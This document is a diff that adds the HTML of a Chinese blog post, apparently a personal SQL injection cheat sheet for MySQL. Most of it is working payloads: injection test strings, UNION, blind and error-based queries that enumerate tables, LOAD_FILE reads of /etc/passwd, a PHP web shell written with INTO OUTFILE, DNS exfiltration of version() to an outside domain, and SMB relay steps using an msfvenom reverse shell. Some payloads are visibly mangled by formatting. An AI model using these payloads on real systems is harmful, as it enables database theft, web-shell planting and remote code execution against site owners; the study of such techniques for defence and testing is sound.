@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png?v=">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png?v=">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png?v=">
+
+
+  <link rel="mask-icon" href="/images/favicon.png?v=" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="KidHat" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="原文：MySQL注入攻击与防御在原文章的基础上做了些整理方便自己的知识整理。 测试注入可以用以下语句对一个可能的注入点进行测试    STRING NUMERIC LOGIN     ‘ AND 1 &amp;#39; OR &amp;#39;1   ‘’ AND 0 &amp;#39; OR 1 — –   &amp;quot; AND true &amp;quot; OR &amp;quot;&amp;quot; = &amp;quot;   &amp;quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="1.MySql注入(基础)">
+<meta property="og:url" content="https://kidhat.github.io/2017/11/04/1-MySql注入-基础/index.html">
+<meta property="og:site_name" content="KidHat">
+<meta property="og:description" content="原文：MySQL注入攻击与防御在原文章的基础上做了些整理方便自己的知识整理。 测试注入可以用以下语句对一个可能的注入点进行测试    STRING NUMERIC LOGIN     ‘ AND 1 &amp;#39; OR &amp;#39;1   ‘’ AND 0 &amp;#39; OR 1 — –   &amp;quot; AND true &amp;quot; OR &amp;quot;&amp;quot; = &amp;quot;   &amp;quot;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://kidhat.github.io/2017/11/04/1-MySql注入-基础/dns.png">
+<meta property="og:image" content="https://kidhat.github.io/2017/11/04/1-MySql注入-基础/smb.png">
+<meta property="og:updated_time" content="2017-11-04T05:16:22.975Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="1.MySql注入(基础)">
+<meta name="twitter:description" content="原文：MySQL注入攻击与防御在原文章的基础上做了些整理方便自己的知识整理。 测试注入可以用以下语句对一个可能的注入点进行测试    STRING NUMERIC LOGIN     ‘ AND 1 &amp;#39; OR &amp;#39;1   ‘’ AND 0 &amp;#39; OR 1 — –   &amp;quot; AND true &amp;quot; OR &amp;quot;&amp;quot; = &amp;quot;   &amp;quot;">
+<meta name="twitter:image" content="https://kidhat.github.io/2017/11/04/1-MySql注入-基础/dns.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://kidhat.github.io/2017/11/04/1-MySql注入-基础/"/>
+
+
+
+
+
+  <title>1.MySql注入(基础) | KidHat</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">KidHat</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">在不断尝试活出更好的自己</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://kidhat.github.io/2017/11/04/1-MySql注入-基础/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="KidHat">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="KidHat">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">1.MySql注入(基础)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-04T11:20:11+08:00">
+                2017-11-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>原文：<a href="http://blog.sycsec.com/?p=1005" target="_blank" rel="external">MySQL注入攻击与防御</a><br>在原文章的基础上做了些整理方便自己的知识整理。</p>
+<h1 id="测试注入"><a href="#测试注入" class="headerlink" title="测试注入"></a>测试注入</h1><p>可以用以下语句对一个可能的注入点进行测试</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><strong>STRING</strong></th>
+<th style="text-align:center"><strong>NUMERIC</strong></th>
+<th style="text-align:center"><strong>LOGIN</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">‘</td>
+<td style="text-align:center">AND 1</td>
+<td style="text-align:center">&#39; OR &#39;1</td>
+</tr>
+<tr>
+<td style="text-align:center">‘’</td>
+<td style="text-align:center">AND 0</td>
+<td style="text-align:center">&#39; OR 1 — –</td>
+</tr>
+<tr>
+<td style="text-align:center">&quot;</td>
+<td style="text-align:center">AND true</td>
+<td style="text-align:center">&quot; OR &quot;&quot; = &quot;</td>
+</tr>
+<tr>
+<td style="text-align:center">&quot;&quot;</td>
+<td style="text-align:center">AND false</td>
+<td style="text-align:center">&quot; OR 1 = 1 — –</td>
+</tr>
+<tr>
+<td style="text-align:center">\</td>
+<td style="text-align:center">12</td>
+<td style="text-align:center">&#39;=&#39;</td>
+</tr>
+<tr>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">&#39;LIKE&#39;</td>
+</tr>
+<tr>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
+<td style="text-align:center">&#39;=0–+</td>
+</tr>
+<tr>
+<td style="text-align:center">SELECT <em>FROM Users WHERE id = &#39;1&#39;&#39;&#39;;<br>SELECT 1 FROM Users WHERE 1 = &#39;1&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;UNION SELECT &#39;2&#39;;</em></td>
+<td style="text-align:center">SELECT FROM Users WHERE id = 3-2;</td>
+<td style="text-align:center">SELECT * FROM Users WHERE username = &#39;admin&#39; AND password = &#39;&#39; OR &#39;&#39; = &#39;&#39;;</td>
+</tr>
+</tbody>
+</table>
+<h1 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h1><p>以下是Mysql中可以用到的注释符：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><strong>符号</strong></th>
+<th style="text-align:center"><strong>解释</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">#</td>
+<td style="text-align:center">Hash注释</td>
+</tr>
+<tr>
+<td style="text-align:center">/*</td>
+<td style="text-align:center">C语言风格注释</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-- X</code>(X为任意字符)和/**/</td>
+<td style="text-align:center">SQL语句注释</td>
+</tr>
+<tr>
+<td style="text-align:center">;%00</td>
+<td style="text-align:center">空字节</td>
+</tr>
+<tr>
+<td style="text-align:center">`</td>
+<td style="text-align:center">反引号(只能在语句尾使用)</td>
+</tr>
+</tbody>
+</table>
+<p>Examples:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM Users WHERE username = &apos;&apos;; OR 1=1 -- -AND password = &apos;&apos;;</div><div class="line">SELECT * FROM Users WHERE id = &apos;&apos; UNION SELECT 1, 2, 3`;</div></pre></td></tr></table></figure></p>
+<p><strong>前缀：</strong></p>
+<p>任意混合 + - ~ !</p>
+<p><code>&#39;or --+2=- -!!!&#39;2</code></p>
+<p>测试后发现and/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(混合后规律又不同)，and/or前的空格可以省略</p>
+<p><code>&#39;or- -!!!1=1；</code></p>
+<h1 id="版本-amp-主机名-amp-用户-amp-库名"><a href="#版本-amp-主机名-amp-用户-amp-库名" class="headerlink" title="版本&amp;主机名&amp;用户&amp;库名"></a>版本&amp;主机名&amp;用户&amp;库名</h1><table>
+<thead>
+<tr>
+<th style="text-align:center"><strong>版本</strong></th>
+<th style="text-align:center"><strong>主机名</strong></th>
+<th style="text-align:center"><strong>用户</strong></th>
+<th style="text-align:center"><strong>库名</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">VERSION()</td>
+<td style="text-align:center">@@HOSTNAME</td>
+<td style="text-align:center">user()</td>
+<td style="text-align:center">database()</td>
+</tr>
+<tr>
+<td style="text-align:center">@@VERSION</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">Current<em>user()</em></td>
+<td style="text-align:center">SELECT schema_name FROM information_schema.schemata;</td>
+</tr>
+<tr>
+<td style="text-align:center">@@GLOBAL.VERSION</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">System_user()</td>
+<td style="text-align:center">SELECT DISTINCT(db) FROM mysql.db;–</td>
+</tr>
+<tr>
+<td style="text-align:center">/<em>!mysql版本号</em>/（/<em>!50094eaea</em>/）当数字小于版本号时返回TRUE</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">Session_user()</td>
+<td style="text-align:center"></td>
+</tr>
+<tr>
+<td style="text-align:center">SELECT * FROM Users WHERE id = &#39;1&#39; AND MID(VERSION(),1,1) = &#39;5&#39;;</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">SELECT CONCATWS(0x3A, user, password) FROM mysql.user WHERE user = &#39;root&#39;–</td>
+</tr>
+</tbody>
+</table>
+<h1 id="表和字段"><a href="#表和字段" class="headerlink" title="表和字段"></a>表和字段</h1><h2 id="确定字段数"><a href="#确定字段数" class="headerlink" title="确定字段数"></a>确定字段数</h2><h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><p>ORDER BY用于判断表中的字段个数</p>
+<table>
+<thead>
+<tr>
+<th><strong>COLUMN</strong></th>
+<th><strong>COLUMN</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1′ ORDER BY 1–+</td>
+<td>True</td>
+</tr>
+<tr>
+<td>1′ ORDER BY 2–+</td>
+<td>True</td>
+</tr>
+<tr>
+<td>1′ ORDER BY 3–+</td>
+<td>True</td>
+</tr>
+<tr>
+<td>1′ ORDER BY 4–+</td>
+<td>False – 字段有三个</td>
+</tr>
+<tr>
+<td>-1′ UNION SELECT 1,2,3–+</td>
+<td>True</td>
+</tr>
+</tbody>
+</table>
+<h3 id="SELECT-…-INTO"><a href="#SELECT-…-INTO" class="headerlink" title="SELECT … INTO"></a>SELECT … INTO</h3><p>关于SELECT … INTO 的解释可以看这一篇文章 <a href="http://www.w3school.com.cn/sql/sql_select_into.asp" target="_blank" rel="external">SELECT … INTO解释</a></p>
+<blockquote>
+<p>SELECT INTO 语句从一个表中选取数据，然后把数据插入另一个表中。常用于创建表的备份复件或者用于对记录进行存档。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>语句</strong></th>
+<th><strong>返回</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-1 UNION SELECT 1 INTO @,@,@</td>
+<td>The used SELECT statements have a different number of columns</td>
+</tr>
+<tr>
+<td>-1 UNION SELECT 1 INTO @,@</td>
+<td>The used SELECT statements have a different number of columns</td>
+</tr>
+<tr>
+<td>-1 UNION SELECT 1 INTO @</td>
+<td>没有报错就说明只有一列</td>
+</tr>
+</tbody>
+</table>
+<p>当出现LIMIT时可以用以下语句：</p>
+<p>SELECT username FROM Users limit 1,{INJECTION POINT};</p>
+<table>
+<thead>
+<tr>
+<th><strong>语句</strong></th>
+<th><strong>释意</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1 INTO @,@,@</td>
+<td>The used SELECT statements have a different number of columns</td>
+</tr>
+<tr>
+<td>1 INTO @,@</td>
+<td>没有报错就说明只有两列</td>
+</tr>
+</tbody>
+</table>
+<h3 id="判断已知表名的字段数"><a href="#判断已知表名的字段数" class="headerlink" title="判断已知表名的字段数"></a>判断已知表名的字段数</h3><p>AND (SELECT * FROM SOME_EXISTING_TABLE) = 1</p>
+<p>SELECT passwd FROM Users WHERE id = {INJECTION POINT};</p>
+<table>
+<thead>
+<tr>
+<th><strong>语句</strong></th>
+<th><strong>释意</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1 AND (SELECT * FROM Users) = 1</td>
+<td>Operand should contain 3 column(s)说明只有3列</td>
+</tr>
+</tbody>
+</table>
+<h2 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h2><p>以下提过几种方式对库中表进行查询</p>
+<table>
+<thead>
+<tr>
+<th><strong>UNION查询</strong></th>
+<th><strong>BLIND盲注</strong></th>
+<th><strong>ERROR报错</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-1&#39; UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables where table_schema=database()</td>
+<td>AND SELECT SUBSTR(table<em>name,1,1) FROM information__schema.tables &gt; &#39;A&#39;</em></td>
+<td>1+and(select 1 from(select count(_),concat((select (select (SELECT distinct concat(0x7e,table_n_ame,0x7e) FROM information<strong>schema.tables where table</strong>schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)_2))x from information_schema.tables group by x)a)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h2><p>以下提过几种方式对表中列进行查询</p>
+<table>
+<thead>
+<tr>
+<th><strong>UNION查询</strong></th>
+<th><strong>BLIND盲注</strong></th>
+<th><strong>ERROR报错</strong></th>
+<th><strong>PROCEDURE ANALYSE</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>UNION SELECT GROUP_CONCAT<br>(column_name) FROM information_schema.<br>columns WHERE table_name = &#39;table_name&#39; 可以不使用单引号，用16进制</td>
+<td>AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; &#39;A&#39;</td>
+<td>1+and(select 1 from(select count(_),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)_2))x from information_schema.tables group by x)a)</td>
+<td>1 LIMIT 1,1 PROCEDURE ANALYSE() 获取到第二个字段名</td>
+</tr>
+</tbody>
+</table>
+<h1 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h1><p>下面的几条语句都可以用以连接字符</p>
+<table>
+<thead>
+<tr>
+<th><strong>字符串连接方式</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SELECT &#39;a&#39; &#39;d&#39; &#39;mi&#39; &#39;n&#39;;</td>
+</tr>
+<tr>
+<td>SELECT CONCAT(&#39;a&#39;, &#39;d&#39;, &#39;m&#39;, &#39;i&#39;, &#39;n&#39;);</td>
+</tr>
+<tr>
+<td>SELECT CONCAT<em>WS(&#39;&#39;, &#39;a&#39;, &#39;d&#39;, &#39;m&#39;, &#39;i&#39;, &#39;n&#39;);</em></td>
+</tr>
+<tr>
+<td>SELECT GROUP_CONCAT(&#39;a&#39;, &#39;d&#39;, &#39;m&#39;, &#39;i&#39;, &#39;n&#39;);</td>
+</tr>
+</tbody>
+</table>
+<h1 id="条件语句-amp-时间函数"><a href="#条件语句-amp-时间函数" class="headerlink" title="条件语句&amp;时间函数"></a>条件语句&amp;时间函数</h1><table>
+<thead>
+<tr>
+<th><strong>条件语句</strong></th>
+<th><strong>时间函数</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CASE</td>
+<td>SLEEP() mysql5以上才引入</td>
+</tr>
+<tr>
+<td>IF()</td>
+<td>BENCHMARK() mysql4/5都有</td>
+</tr>
+<tr>
+<td>IFNULL()</td>
+<td>&#39; – (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(&#39;true&#39;)), false)) – &#39;</td>
+</tr>
+<tr>
+<td>NULLIF()</td>
+<td>SELECT IF(1=1, sleep(5), false);</td>
+</tr>
+<tr>
+<td>SELECT IF(1=1, true, false);</td>
+<td></td>
+</tr>
+<tr>
+<td>SELECT CASE WHEN 1=1 THEN true ELSE false END;</td>
+</tr>
+</tbody>
+</table>
+<p>其中BENCHMARK函数是指执行某函数的次数，次数多时能够达到与sleep函数相同的效果</p>
+<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><h2 id="文件操作权限"><a href="#文件操作权限" class="headerlink" title="文件操作权限"></a>文件操作权限</h2><p>在MySQL中，存在一个称为secure\ <strong>file</strong> __priv的全局系统变量。 该变量用于限制数据的导入和导出操作，例如SELECT … INTO OUTFILE语句和LOAD_FILE（）</p>
+<blockquote>
+<ol>
+<li>如果secure\ <strong>file</strong> __priv变量为空那么直接可以使用函数,如果为null是不能使用</li>
+<li>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</li>
+</ol>
+</blockquote>
+<p><code>select @@version;</code><br><code>show variables like &quot;secure_file_priv&quot;;</code></p>
+<p>也可使用如下语句查询</p>
+<table>
+<thead>
+<tr>
+<th><strong>语句</strong></th>
+<th><strong>是否需需要ROOT</strong></th>
+<th><strong>版本支持</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SELECT file<em>priv FROM mysql.user WHERE user = &#39;username&#39;;</em></td>
+<td>需要root</td>
+<td>mysql4/5</td>
+</tr>
+<tr>
+<td>SELECT grantee, isgrantable FROM information_schema.user_privileges WHERE privilege_type = &#39;file&#39; AND grantee like &#39;%username%&#39;;</td>
+<td>不需要root</td>
+<td>mysql5</td>
+</tr>
+</tbody>
+</table>
+<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>读文件函数LOAD_FILE()</p>
+<p>Examples:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT LOAD\_FILE(&apos;/etc/passwd&apos;);</div><div class="line">SELECT LOAD\_FILE(0x2F6574632F706173737764);</div></pre></td></tr></table></figure>
+<p>注意点：</p>
+<ol>
+<li>LOAD_FILE的默认目录@@datadir</li>
+<li>文件必须是当前用户可读</li>
+<li>读文件最大的为1048576个byte, @@max_allowed_packet可以查看文件读取最大值</li>
+</ol>
+<h2 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h2><p>INTO OUTFILE/DUMPFILE</p>
+<p>经典写文件例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">To write a PHP shell:SELECT &apos;&lt;? system($_GET[\&apos;c\&apos;]); ?&gt;&apos; INTO OUTFILE &apos;/var/www/shell.php&apos;;</div></pre></td></tr></table></figure>
+<p><strong>这两个函数都可以写文件，但是有很大的差别<br>INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符<br>INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择<br>当我们在UDF提权的场景是需要上传二进制文件等等用OUTFILE函数是不能成功的</strong><br>网上有很多文章介绍，比如 <a href="http://www.cnblogs.com/milantgh/p/5444398.html" target="_blank" rel="external">这篇</a></p>
+<p>注意点：</p>
+<ol>
+<li>INTO OUTFILE不会覆盖文件</li>
+<li>INTO OUTFILE必须是查询语句的最后一句</li>
+<li>路径名是不能编码的，必须使用单引号</li>
+</ol>
+<h1 id="带外通道"><a href="#带外通道" class="headerlink" title="带外通道"></a>带外通道</h1><h2 id="什么是带外通道注入？"><a href="#什么是带外通道注入？" class="headerlink" title="什么是带外通道注入？"></a>什么是带外通道注入？</h2><p>带外通道攻击主要是利用其他协议或者渠道从服务器提取数据. 它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等.</p>
+<h2 id="条件限制"><a href="#条件限制" class="headerlink" title="条件限制"></a>条件限制</h2><ul>
+<li>首先不用多说,这些函数是需要绝对路径的</li>
+<li>如果secure\ <strong>file</strong> __priv变量为空那么直接可以使用函数,如果为null是不能使用</li>
+<li>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</li>
+</ul>
+<h2 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select load_file(concat(&apos;\\\\&apos;,version(),&apos;.rootclay.club\\clay.txt&apos;));</div><div class="line">select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));</div></pre></td></tr></table></figure>
+<p>上面的语句执行的结果我们可以通过wireshark抓包看一下，过滤一下DNS协议即可清晰看到数据出去的样子，如下图<br><img src="/2017/11/04/1-MySql注入-基础/dns.png" alt=""><br>进行DNS注入需要域名解析，自己有的话最好，但是没有的朋友也没事，这里推荐一个网站 <a href="http://ceye.io/record/index" target="_blank" rel="external">CEYE</a>可以查看数据</p>
+<h1 id="SMB-Relay-注入攻击"><a href="#SMB-Relay-注入攻击" class="headerlink" title="SMB Relay 注入攻击"></a>SMB Relay 注入攻击</h1><p><strong>假设有主机B与A</strong><br>(1) A向B发起连接请求<br>(2) B向A发送挑战(一组随机数据，8字节)<br>(3) A用源自明文口令的DESKEY对挑战进行标准DES加密得到响应，并发往B<br>(4) B从SAM中获取A的LM Hash、NTLM Hash，计算出DESKEY，并对前面发往A的挑战进<br>行标准DES加密<br>(5) 如果(4)中计算结果与A送过来的响应匹配，A被允许访问B<br><strong>现在假设一个攻击者C卷入其中</strong><br>(1) C向B发起连接请求<br>(2) B向C发送挑战D(一组随机数据)<br>(3) C等待A向B发起连接请求<br>(4) 当A向B发起连接请求时，C伪造成B向A发送挑战D<br>(5) A用源自明文口令的DESKEY对挑战D进行标准DES加密得到响应E，并发往B<br>(6) C截获到响应E，将它做为针对(2)中挑战D的响应发往B，并声称自己是A<br>(7) B从SAM中获取A的LM Hash、NTLM Hash，计算出DESKEY，并对挑战D进行标准DES<br>加密<br>(8) 如果(7)中计算结果与C送过来的响应匹配，C被允许以A的身份访问B。</p>
+<p>攻击流程</p>
+<p> <img src="/2017/11/04/1-MySql注入-基础/smb.png" alt=""></p>
+<p>关于SMB relay攻击窃取NTML与shell请看这篇文章 <a href="http://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python" target="_blank" rel="external">SMB Relay Demystified and NTLMv2 Pwnage with Python</a></p>
+<p>整理了一下实际操作的步骤如下:</p>
+<ol>
+<li>首先生成一个反向shell:<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=攻击机监听端口 -f exe &gt; reverse_shell.exe</li>
+<li>运行 <a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="external">smbrelayx</a>，指定被攻击者和生成的反向shell，等待连接。<br>smbrelayx.py -h 被攻击者ip -e 反向shell文件位置</li>
+<li>使用模块multi/handler。侦听攻击机ip,攻击机监听端口</li>
+<li>在MySQL Server上运行如下的代码，则会产生shell。相当于访问攻击机的smb服务,但实际上是窃取了mysql<em>server的身份<br>select load</em> file(&#39;\攻击机ip\aa&#39;);</li>
+</ol>
+<p>推荐阅读：<br><a href="https://www.sitedirsec.com/tool/sql.htm#MySQL_Default_Databases" target="_blank" rel="external">https://www.sitedirsec.com/tool/sql.htm#MySQL_Default_Databases</a><br><a href="https://websec.files.wordpress.com/2010/11/sqli2.pdf" target="_blank" rel="external">https://websec.files.wordpress.com/2010/11/sqli2.pdf</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/24/Web-Security-Learning/" rel="next" title="Web-Security-Learning">
+                <i class="fa fa-chevron-left"></i> Web-Security-Learning
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="KidHat" />
+            
+              <p class="site-author-name" itemprop="name">KidHat</p>
+              <p class="site-description motion-element" itemprop="description">冷冷雨喔呃喔...</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
